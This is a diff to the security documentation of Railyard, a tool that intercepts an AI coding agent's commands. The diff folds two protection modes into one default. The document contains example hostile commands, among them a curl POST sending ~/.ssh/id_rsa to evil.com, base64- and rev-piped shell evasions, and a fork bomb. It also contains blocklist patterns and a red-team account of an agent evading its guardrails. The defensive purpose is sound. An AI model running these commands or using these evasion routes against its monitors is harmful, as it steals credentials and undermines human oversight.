@@ -16,12 +16,12 @@ Read this first. No marketing, no hedging.
 
 ### What it does
 
-- **Blocks known-destructive commands** — `terraform destroy`, `rm -rf ~/`, `DROP DATABASE`, `git push --force`, and 25+ more patterns. Works in both chill and hardcore modes. Deterministic regex matching, <2ms.
+- **Blocks known-destructive commands** — `terraform destroy`, `rm -rf ~/`, `DROP DATABASE`, `git push --force`, and 25+ more patterns. Deterministic regex matching, <2ms.
 - **Catches common evasion** — base64 encoding, variable expansion, shell wrappers, eval concat, hex escapes, backtick substitution. Multi-layer decoding (double/triple base64). Recursive normalization.
-- **Detects evasion shapes** — `rev | sh`, `tr | sh`, `python3 -c "chr(...)"`, `subprocess.run(...)`. These trigger immediate session termination in hardcore mode (Tier 1).
+- **Detects evasion shapes** — `rev | sh`, `tr | sh`, `python3 -c "chr(...)"`, `subprocess.run(...)`. These trigger immediate session termination (Tier 1).
 - **Tracks behavioral patterns** — If the agent gets blocked and retries with different syntax using the same keywords, Railyard catches it (Tier 3). Escalating suspicion model.
-- **Fences the filesystem** — In hardcore mode, the agent can only access the project directory. `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.claude`, `/etc` are denied. Paths are canonicalized (symlinks resolved, `../` collapsed, `$HOME` expanded).
-- **Gates network access** — In hardcore mode, `curl POST`, `wget`, `ssh` require human approval. `curl | sh` and `netcat` are blocked outright.
+- **Fences the filesystem** — The agent can only access the project directory. `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.claude`, `/etc` are denied. Paths are canonicalized (symlinks resolved, `../` collapsed, `$HOME` expanded).
+- **Gates network access** — `curl POST`, `wget`, `ssh` require human approval. `curl | sh` and `netcat` are blocked outright.
 - **Protects its own hooks** — Self-integrity check on every invocation verifies hooks are still in `~/.claude/settings.json`. If tampered, all tool calls are blocked.
 - **Can't be uninstalled by the agent** — Blocklist rule + TTY check + native OS confirmation dialog.
 - **Snapshots before writes** — SHA-256 checksummed file backups before every Write/Edit. Rollback by step, file, or entire session.
@@ -35,7 +35,6 @@ Read this first. No marketing, no hedging.
 - **Does not provide process isolation.** Railyard runs as the same OS user as Claude Code. No memory isolation, no privilege separation. For true sandboxing, you'd need a micro-VM (Firecracker, gVisor).
 - **Does not protect against Claude Code hook bypass.** If Claude Code itself has a vulnerability that lets the agent skip hooks entirely, Railyard is out of the loop. The OS sandbox (if manually enabled) would still apply.
 - **Open-source detection rules are readable.** Every regex, shape pattern, and behavioral threshold is in the source code. A sufficiently capable agent could read the rules and craft a bypass that avoids all patterns on the first attempt (no Tier 3 retry to catch). The OS sandbox is the counter: it doesn't care how the command was constructed.
-- **Chill mode has large gaps.** No path fence, no network policy, no evasion rules, no threat detection. It only blocks the most destructive literal commands. A prompt-injected agent in chill mode can read `~/.ssh/id_rsa`, `curl POST` it somewhere, and Railyard won't intervene.
 - **71% block rate, not 100%.** Three rounds of adversarial red-teaming achieved 71% block rate. The remaining 29% are interpreter-internal runtime construction that only OS-level sandboxing can defeat. We are honest about this number because security tools that claim 100% are lying.
 
 ---
@@ -111,12 +110,12 @@ Railyard is a Rust binary that intercepts AI agent tool calls (shell commands, f
 |----------------|--------|---------------|----------------------|---------------|
 | **Spoofing** | Agent impersonates a human to bypass approval gates | `ask` decision flow | Approval surfaces to the actual terminal user; agent cannot interact with interactive prompts | Agent could social-engineer the human via persuasive output text |
 | **Spoofing** | Agent crafts hook input to spoof a different tool name | Hook JSON input (`tool_name` field) | Claude Code controls the hook invocation; the agent does not construct the JSON | Requires Claude Code vulnerability — outside Railyard's threat model |
-| **Tampering** | Agent modifies `railyard.yaml` to weaken policy | File write via Edit/Write tools | Self-protection rule blocks writes to `.claude/settings.json`; fence blocks writes outside project dir (hardcore mode) | Agent could modify `railyard.yaml` within the project directory; mitigated by policy reload from defaults on each invocation |
+| **Tampering** | Agent modifies `railyard.yaml` to weaken policy | File write via Edit/Write tools | Self-protection rule blocks writes to `.claude/settings.json`; fence blocks writes outside project dir | Agent could modify `railyard.yaml` within the project directory; mitigated by policy reload from defaults on each invocation |
 | **Tampering** | Agent uninstalls Railyard hooks | `railyard uninstall` command | Three-layer self-protection: (1) command blocklist, (2) stdin TTY check, (3) native OS confirmation dialog | Agent would need to bypass all three layers simultaneously |
 | **Tampering** | Agent deletes the Railyard binary | `rm ~/.cargo/bin/railyard` | Blocklist rule `railyard-remove-binary` blocks rm/unlink/mv targeting the binary path | Agent could rename the binary via a path the regex doesn't match; mitigated by Claude Code continuing to invoke the hook path regardless |
-| **Repudiation** | Agent executes destructive action with no audit trail | All tool calls | Structured JSONL trace logging of every tool call, decision, rule matched, and timing | Trace logs are stored in `.railyard/traces/` within the project — agent could delete them if path fence is disabled (chill mode) |
-| **Information Disclosure** | Agent reads sensitive files (~/.ssh, ~/.aws, /etc) | File read via Read tool or `cat` command | Path fence (hardcore mode) denies access to configured sensitive directories; OS sandbox enforces at kernel level | Chill mode has no path fence — by design, but this means zero file access protection |
-| **Information Disclosure** | Agent exfiltrates data via network | `curl -X POST`, `nc`, `scp` | Network policy rules (hardcore mode) block or require approval for outbound data transfer | Chill mode has no network restrictions; hardcore mode can be bypassed if the agent uses a tool not covered by regex patterns (e.g., a compiled binary) |
+| **Repudiation** | Agent executes destructive action with no audit trail | All tool calls | Structured JSONL trace logging of every tool call, decision, rule matched, and timing | Trace logs are stored in `.railyard/traces/` within the project — agent could potentially delete them if path fence is misconfigured |
+| **Information Disclosure** | Agent reads sensitive files (~/.ssh, ~/.aws, /etc) | File read via Read tool or `cat` command | Path fence denies access to configured sensitive directories; OS sandbox enforces at kernel level | Path fence can be bypassed if agent uses a technique the regex doesn't cover; OS sandbox is the definitive control |
+| **Information Disclosure** | Agent exfiltrates data via network | `curl -X POST`, `nc`, `scp` | Network policy rules block or require approval for outbound data transfer | Can be bypassed if the agent uses a tool not covered by regex patterns (e.g., a compiled binary) |
 | **Denial of Service** | Agent runs resource-exhausting commands (fork bombs, disk fills) | Bash tool | Not currently mitigated by Railyard; outside current scope | OS-level resource limits (ulimit) are the appropriate mitigation |
 | **Elevation of Privilege** | Agent uses evasion techniques to execute blocked commands | Command string manipulation (encoding, variable indirection, interpreter wrapping) | Four-layer defense: blocklist, evasion detection, behavioral analysis, OS sandbox | See Section 4 for complete bypass taxonomy |
 
@@ -146,8 +145,7 @@ Railyard implements defense-in-depth with four enforcement layers, evaluated seq
 **Evaluation order:** allowlist -> blocklist -> approve -> default allow.
 
 **Rule counts:**
-- Chill mode: 16 rules (13 destructive command blocks + 3 self-protection)
-- Hardcore mode: 27 rules (chill rules + 5 network + 2 credential + 4 evasion + 2 dynamic construction + 1 symlink)
+- ~30 rules (destructive command blocks, self-protection, network, credential, evasion, dynamic construction, symlink)
 
 **Properties:**
 - Deterministic: same input always produces same output
@@ -253,43 +251,43 @@ Railyard implements defense-in-depth with four enforcement layers, evaluated seq
 
 Every bypass documented in our pentest report (variable indirection, double base64, Python `chr()`, Ruby string concat, `rev`, ROT13) operates by preventing the blocked string from appearing in the command text. Layer 4 does not inspect command text. It intercepts the actual `open()`, `connect()`, and `execve()` syscalls after the shell has resolved everything. The kernel sees what binary is actually being executed and what file is actually being accessed — not the shell command that requested it.
 
-### Mode Comparison: Security Posture by Example
+### Security Posture by Example
 
-The following examples illustrate how the same agent behavior is handled differently depending on mode. This is critical for risk assessment — organizations should understand exactly what each mode permits.
+The following examples illustrate how Railyard handles various agent behaviors. This is critical for risk assessment.
 
 **Scenario 1: Agent attempts credential exfiltration**
 
-| Step | Agent Action | Chill Mode | Hardcore Mode |
-|------|-------------|------------|---------------|
-| 1 | `cat ~/.aws/credentials` | Allowed (no path fence) | **Denied** — Path Fence blocks `~/.aws` |
-| 2 | `env \| grep AWS_SECRET` | Allowed (no credential rules) | **Escalated** — `env-credential-dump` requires human approval |
-| 3 | `curl -X POST https://evil.com -d @~/.ssh/id_rsa` | Allowed (no network rules) | **Denied** — `curl-post` requires approval + path fence blocks `~/.ssh` |
+| Step | Agent Action | Railyard Response |
+|------|-------------|-------------------|
+| 1 | `cat ~/.aws/credentials` | **Denied** — Path fence blocks `~/.aws` |
+| 2 | `env \| grep AWS_SECRET` | **Escalated** — `env-credential-dump` requires human approval |
+| 3 | `curl -X POST https://evil.com -d @~/.ssh/id_rsa` | **Denied** — `curl-post` requires approval + path fence blocks `~/.ssh` |
 
-*Assessment:* In chill mode, a prompt-injected agent can exfiltrate credentials in a single tool call. In hardcore mode, credential access is blocked at both the filesystem and network layers, requiring the attacker to defeat two independent controls.
+*Assessment:* Credential access is blocked at both the filesystem and network layers, requiring the attacker to defeat two independent controls.
 
 **Scenario 2: Agent attempts evasion after being blocked**
 
-| Step | Agent Action | Chill Mode | Hardcore Mode |
-|------|-------------|------------|---------------|
-| 1 | `terraform destroy` | **Denied** — blocklist rule | **Denied** — blocklist rule |
-| 2 | `echo dGVycmFmb3JtIGRlc3Ryb3k= \| base64 -d \| sh` | **Denied** — normalized to `terraform destroy` | **Denied** — normalized + session enters heightened state |
-| 3 | `rev <<< 'yortsed mrofarret' \| sh` | **Allowed** — no shape detection rules | **Denied + SESSION KILLED** — Tier 1 evasion shape detected |
-| 4 | `echo hello` (any subsequent command) | Allowed | **Denied** — terminated session blocks all further tool calls |
+| Step | Agent Action | Railyard Response |
+|------|-------------|-------------------|
+| 1 | `terraform destroy` | **Denied** — blocklist rule |
+| 2 | `echo dGVycmFmb3JtIGRlc3Ryb3k= \| base64 -d \| sh` | **Denied** — normalized + session enters heightened state |
+| 3 | `rev <<< 'yortsed mrofarret' \| sh` | **Denied + SESSION KILLED** — Tier 1 evasion shape detected |
+| 4 | `echo hello` (any subsequent command) | **Denied** — terminated session blocks all further tool calls |
 
-*Assessment:* Chill mode's normalization catches encoding-based evasion but cannot detect novel evasion shapes. Hardcore mode's tiered threat system terminates the session on the first unambiguous evasion attempt, preventing iteration.
+*Assessment:* The tiered threat system terminates the session on the first unambiguous evasion attempt, preventing iteration.
 
 **Scenario 3: Legitimate development workflow**
 
-| Step | Agent Action | Chill Mode | Hardcore Mode |
-|------|-------------|------------|---------------|
-| 1 | `cargo build --release` | Allowed | Allowed |
-| 2 | `npm test` | Allowed | Allowed |
-| 3 | `git commit -m "fix bug"` | Allowed | Allowed |
-| 4 | `curl https://registry.npmjs.org/left-pad` (GET) | Allowed | Allowed |
-| 5 | `ssh deploy@prod.example.com` | Allowed | **Escalated** — `ssh` requires human approval |
-| 6 | `npm publish` | **Escalated** — requires approval | **Escalated** — requires approval |
+| Step | Agent Action | Railyard Response |
+|------|-------------|-------------------|
+| 1 | `cargo build --release` | Allowed |
+| 2 | `npm test` | Allowed |
+| 3 | `git commit -m "fix bug"` | Allowed |
+| 4 | `curl https://registry.npmjs.org/left-pad` (GET) | Allowed |
+| 5 | `ssh deploy@prod.example.com` | **Escalated** — `ssh` requires human approval |
+| 6 | `npm publish` | **Escalated** — requires approval |
 
-*Assessment:* Normal development is unimpeded in both modes. The main friction in hardcore mode is human approval for network-facing operations (SSH, POST, wget) and publishing. This is the intended tradeoff: minor interruptions for significantly reduced blast radius.
+*Assessment:* Normal development is unimpeded. The main friction is human approval for network-facing operations (SSH, POST, wget) and publishing. This is the intended tradeoff: minor interruptions for significantly reduced blast radius.
 
 ### Self-Protection Mechanisms
 
@@ -364,7 +362,7 @@ Railyard prevents the agent from disabling it through three independent layers:
 
 *Mitigation:*
 1. OS sandbox (Layer 4) cannot be bypassed by reading source code — it operates at the kernel level on actual syscalls, not command strings
-2. Opaque local rules: users can add custom detection patterns in `~/.railyard/local-rules.yaml` (not committed to source control, not readable by the agent in hardcore mode)
+2. Opaque local rules: users can add custom detection patterns in `~/.railyard/local-rules.yaml` (not committed to source control, not readable by the agent due to path fencing)
 3. Behavioral detection (Tier 3) is difficult to game even with full source access because the agent cannot observe Railyard's internal state (keyword list, heightened window) during execution
 4. Future: non-deterministic LLM-as-judge that evaluates intent rather than pattern matching
 
@@ -416,7 +414,7 @@ Railyard prevents the agent from disabling it through three independent layers:
 | Double-encoded base64 with interpreter decode (`python3 -c "b64decode(...)"` where the shape doesn't match `chr(\|b64decode\|...`) | If the obfuscation pattern uses a function name not in the shape detector's list, it passes. | Interpreter evasion | **Medium.** Mitigated by Tier 3 behavioral detection if a prior block occurred. |
 | Novel encoding piped to shell (e.g., custom cipher implemented inline) | Infinite possible encoding schemes. Static detection cannot enumerate them all. | Turing-complete evasion | **Medium.** Mitigated by shape detection (`<anything> \| sh` patterns) if the pipe-to-shell structure is present. |
 | Legitimate-looking commands with harmful side effects (`npm install malicious-package`) | Command text contains no blocked pattern. The harm is in the package content, not the command syntax. | Semantic attacks | **Medium.** Outside Railyard's scope; mitigated by OS sandbox constraining side effects. |
-| Data exfiltration in chill mode (`curl -X POST`, `cat ~/.ssh/id_rsa`) | Chill mode intentionally disables path fence and network restrictions. | Design decision | **High** in chill mode. Users accept this tradeoff for reduced friction. |
+| Data exfiltration if path fence or network rules are disabled (`curl -X POST`, `cat ~/.ssh/id_rsa`) | If users disable path fence or network restrictions in their configuration, these protections are absent. | Configuration decision | **High** if protections are disabled. Users who disable these features accept this tradeoff for reduced friction. |
 | Fork bomb / resource exhaustion (`:(){ :\|:& };:`) | Not a pattern Railyard blocks; not a destructive data operation. | Availability attack | **Low.** OS-level ulimits are the correct mitigation. |
 
 ### Comparison With Alternative Approaches
@@ -427,8 +425,7 @@ Railyard prevents the agent from disabling it through three independent layers:
 | **Prompt-based guardrails** (system prompt tells LLM "don't run destructive commands") | None — LLM can ignore its own instructions; documented in Issue #29691 | Good | Low | None |
 | **Manual human review of every command** | Perfect (human evaluates intent) | Very poor — breaks agent autonomy entirely | N/A | None |
 | **OS sandbox only** (no command inspection) | Perfect for file/network restrictions; no command-level blocking | Good | Low | Moderate (profile generation) |
-| **Railyard (chill mode)** | Good for known destructive commands; no path/network protection | Very good (minimal friction) | Very low (curated rules target specific patterns) | One command (`railyard install`) |
-| **Railyard (hardcore mode)** | Strong — four layers with behavioral detection and OS sandbox | Good (some approve prompts for network/credentials) | Low (shape detectors target patterns with no legitimate use) | One command + OS sandbox auto-configured |
+| **Railyard** | Strong — four layers with behavioral detection and OS sandbox; ~30 rules covering destructive commands, path fencing, network controls, and evasion detection | Good (some approve prompts for network/credentials) | Low (shape detectors target patterns with no legitimate use) | One command (`railyard install`) + OS sandbox auto-configured |
 
 ---
 
@@ -443,7 +440,7 @@ Railyard prevents the agent from disabling it through three independent layers:
 | Unit tests (evasion detection, regex matching, path fence, policy engine, snapshot, trace, threat classifier, session state, sandbox generation) | 73 | `src/**/*.rs` (`#[cfg(test)]` modules) |
 | Integration tests (attack simulation — real incident reproductions, evasion attempts, fence violations, policy config, self-protection, trace logging, pentest fixes) | 36 | `tests/attack_simulation.rs` |
 | Integration tests (rollback scenarios — snapshot capture, step-back, multi-file rollback, fork-and-rollback) | 15 | `tests/rollback_scenarios.rs` |
-| Integration tests (threat detection — Tier 1/2/3 termination, state persistence, forensic breadcrumbs, chill mode) | 12 | `tests/threat_detection.rs` |
+| Integration tests (threat detection — Tier 1/2/3 termination, state persistence, forensic breadcrumbs, policy configuration) | 12 | `tests/threat_detection.rs` |
 
 All tests pass on current main branch. Integration tests invoke the compiled Railyard binary via `std::process::Command`, simulating actual Claude Code hook invocations with JSON payloads on stdin.
 
@@ -451,7 +448,7 @@ All tests pass on current main branch. Integration tests invoke the compiled Rai
 
 Three rounds of adversarial penetration testing were conducted using Claude Code itself as the attacker. The agent was given the goal of executing blocked commands and instructed to use any technique available.
 
-**Round 1 — Baseline (chill mode, 16 rules):**
+**Round 1 — Baseline (16 rules, no evasion detection):**
 - 13 vectors tested
 - 2 blocked, 11 bypassed
 - **Block rate: 15%**
@@ -496,7 +493,7 @@ cargo test --test attack_simulation    # Attack simulation subset
 | Control | Description | Railyard Coverage |
 |---------|-------------|------------------|
 | CC6.1 | Logical access controls | Policy engine implements allowlist/blocklist/approve gates. Fence restricts filesystem access to project directory. OS sandbox enforces at kernel level. |
-| CC6.6 | Security measures against threats from external sources | Evasion detection (Layer 2) and behavioral analysis (Layer 3) defend against prompt injection leading to destructive commands. Network policy (hardcore mode) restricts outbound connections. |
+| CC6.6 | Security measures against threats from external sources | Evasion detection (Layer 2) and behavioral analysis (Layer 3) defend against prompt injection leading to destructive commands. Network policy restricts outbound connections. |
 | CC6.7 | Restrict transmission of confidential information | Path fence denies read/write to `~/.ssh`, `~/.aws`, `~/.gnupg`. Network rules require approval for `curl POST`, block `nc`/`netcat`. OS sandbox denies network by default. |
 | CC7.1 | Detection and monitoring of anomalies | Structured JSONL trace logging of every tool call with timestamp, session ID, decision, matched rule, and latency. Session state tracks suspicion level and block history. |
 | CC7.2 | Anomaly response | Tier 1/2/3 escalation: warn, block, or terminate session. Forensic breadcrumb written on termination. Restart warning surfaces prior violations. |
@@ -505,10 +502,10 @@ cargo test --test attack_simulation    # Attack simulation subset
 
 | Function / Category | Control | Railyard Coverage |
 |---------------------|---------|------------------|
-| PR.AC (Access Control) | PR.AC-1: Identities and credentials managed | Path fence denies access to credential stores (~/.ssh, ~/.aws, ~/.gnupg). Credential leakage rules (env dump, git config) in hardcore mode. |
-| PR.AC (Access Control) | PR.AC-4: Access managed with least privilege | Default-deny path fence (hardcore): only project directory accessible. OS sandbox: default-deny with explicit allows. |
+| PR.AC (Access Control) | PR.AC-1: Identities and credentials managed | Path fence denies access to credential stores (~/.ssh, ~/.aws, ~/.gnupg). Credential leakage rules (env dump, git config) active by default. |
+| PR.AC (Access Control) | PR.AC-4: Access managed with least privilege | Default-deny path fence: only project directory accessible. OS sandbox: default-deny with explicit allows. |
 | PR.DS (Data Security) | PR.DS-1: Data at rest protected | Snapshots use SHA-256 content addressing. Audit logs record all file modifications. Rollback capability for all writes. |
-| PR.DS (Data Security) | PR.DS-5: Protections against data leaks | Network egress controls (hardcore). Path fence blocks credential access. Trace logging enables post-incident data flow analysis. |
+| PR.DS (Data Security) | PR.DS-5: Protections against data leaks | Network egress controls active by default. Path fence blocks credential access. Trace logging enables post-incident data flow analysis. |
 | DE.CM (Continuous Monitoring) | DE.CM-1: Network monitored | Network policy rules detect and block/approve outbound connections (curl, wget, nc, ssh, scp). |
 | DE.CM (Continuous Monitoring) | DE.CM-4: Malicious code detected | Evasion detection identifies obfuscated command construction. Shape detection catches structural evasion patterns. Behavioral analysis detects retry sequences. |
 
@@ -520,7 +517,7 @@ cargo test --test attack_simulation    # Attack simulation subset
 | LLM02: Insecure Output Handling | All LLM outputs (tool calls) are validated against policy before execution. Blocked outputs never reach the system. |
 | LLM04: Model Denial of Service | Resource exhaustion is outside Railyard's scope. OS-level ulimits are the appropriate control. |
 | LLM06: Excessive Agency | Railyard directly constrains agent capabilities: commands are blocked, file access is fenced, network is restricted. The agent cannot exceed its policy-defined boundary. |
-| LLM07: System Prompt Leakage | If the agent is instructed to read `~/.claude/` or other configuration paths, the path fence blocks it (hardcore mode). |
+| LLM07: System Prompt Leakage | If the agent is instructed to read `~/.claude/` or other configuration paths, the path fence blocks it. |
 | LLM09: Overreliance | Railyard provides deterministic enforcement rather than relying on the LLM's own safety training, which can be bypassed (ref: Issue #29691). |
 
 ### CIS Controls v8
@@ -528,7 +525,7 @@ cargo test --test attack_simulation    # Attack simulation subset
 | Control | Description | Railyard Coverage |
 |---------|-------------|------------------|
 | 3.3 | Configure data access control lists | `railyard.yaml` defines explicit allow/block/approve rules. Path fence defines allowed/denied directories. |
-| 4.1 | Establish and maintain a secure configuration process | Default policies ship with Railyard (chill/hardcore). `railyard configure` provides interactive setup. Policy is version-controlled YAML. |
+| 4.1 | Establish and maintain a secure configuration process | Default policies ship with Railyard. `railyard configure` provides interactive setup. Policy is version-controlled YAML. |
 | 6.1 | Establish access logging process | JSONL trace logging of every tool call with decision, rule, timing. `railyard log` for review. |
 | 6.2 | Collect audit logs | Trace logs stored per-session in `.railyard/traces/`. Session state stored in `.railyard/state/`. |
 | 8.2 | Collect audit logs for threat detection | Behavioral analysis uses session state (block history, suspicion level, heightened keywords) for threat detection across tool calls. |
@@ -605,12 +602,6 @@ allowlist:
     action: allow
 ```
 
-**Chill mode option:** Switch to chill mode to remove network, credential, and evasion detection rules while retaining destructive command blocking.
-
-```bash
-railyard install --mode chill
-```
-
 **Trace-based debugging:** Use `railyard log --session <id>` to identify which rule triggered the false positive, then adjust the policy accordingly.
 
 **Environment variable override:** `RAILYARD_NO_KILL=1` disables session termination via SIGTERM (for testing only; does not disable blocking).
@@ -652,22 +643,22 @@ Railyard is open source. Every detection regex, shape pattern, tier threshold, a
 
 1. **OS sandbox (Layer 4)** is immune to this. It operates on actual syscalls, not command strings. Reading the sandbox profile tells you what paths are denied — but that's the point. You still cannot access them.
 
-2. **Opaque local rules.** Users can add custom detection patterns in configuration files not committed to source control and not accessible to the agent (path-fenced in hardcore mode).
+2. **Opaque local rules.** Users can add custom detection patterns in configuration files not committed to source control and not accessible to the agent (path-fenced by default).
 
 3. **Behavioral state is partially opaque.** While the heightened window size (3 tool calls) and keyword extraction algorithm are in the source, the agent cannot observe Railyard's internal state during execution. It does not know which keywords are being tracked, what the current suspicion level is, or when the heightened window expires.
 
 4. **Non-deterministic LLM judge (future work).** A planned enhancement sends suspicious post-block commands to a fast LLM (e.g., Haiku) for intent evaluation. The LLM understands semantic intent, not patterns. Its judgment is non-deterministic and cannot be predicted by reading source code.
 
-### Chill Mode Limitations
+### Customization and Reduced Protection
 
-Chill mode intentionally provides no protection against:
+Users can disable individual rules or categories in `railyard.yaml`. If protections such as path fencing, network controls, or evasion detection are disabled, Railyard provides no protection against:
 - File access outside the project directory
 - Reading sensitive files (~/.ssh, ~/.aws, ~/.gnupg, /etc)
 - Network data exfiltration
 - Credential leakage via environment dump
-- Evasion via encoding/obfuscation (shape detection and behavioral analysis are hardcore-only for Tier 1/2 classification, though the core blocklist still applies normalization)
+- Evasion via encoding/obfuscation
 
-This is a deliberate design decision: chill mode optimizes for minimal friction, protecting only against the most destructive operations (terraform destroy, rm -rf, DROP DATABASE, etc.) and self-disabling. Users who need stronger protection should use hardcore mode.
+Users who disable protections accept these tradeoffs. The default configuration includes all ~30 rules and all four detection layers.
 
 ### Trust in Claude Code Hook System
 
